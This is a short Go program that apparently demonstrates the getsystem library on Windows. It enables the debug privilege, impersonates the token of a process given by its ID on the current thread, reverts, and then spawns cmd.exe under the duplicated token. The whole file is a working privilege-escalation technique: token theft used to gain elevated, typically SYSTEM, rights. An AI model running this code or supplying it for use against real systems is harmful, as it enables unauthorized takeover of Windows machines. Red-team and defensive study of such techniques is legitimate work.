package main

import (
	"log"
	"os"
	"strconv"

	"github.com/audibleblink/getsystem"
	"github.com/pkg/errors"
	"golang.org/x/sys/windows"
)

func main() {
	pid, _ := strconv.Atoi(os.Args[1])

	log.Print("Enabling seDebug...")
	err := getsystem.DebugPriv()
	if err != nil {
		log.Printf("%v", errors.Cause(err))

	}
	log.Println("OK")

	printCurrentThreadOwner()

	log.Println("Beginning Token impersonation in current thread")

	err = getsystem.OnThread(pid)
	if err != nil {
		log.Printf("%v", errors.Cause(err))

	}

	printCurrentThreadOwner()

	log.Println("Reverting to previous user")

	err = windows.RevertToSelf()
	if err != nil {
		log.Printf("%v", errors.Cause(err))

	}

	printCurrentThreadOwner()

	log.Println("Starting new process with duplicated token")
	err = getsystem.InNewProcess(pid, `c:\windows\system32\cmd.exe`, false)
	if err != nil {
		log.Printf("%v", errors.WithStack(err))

	}
}

func printCurrentThreadOwner() {
	t := windows.GetCurrentThreadEffectiveToken()
	user, err := getsystem.TokenOwner(t)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Current effective thread owner: %s\n", user)
}
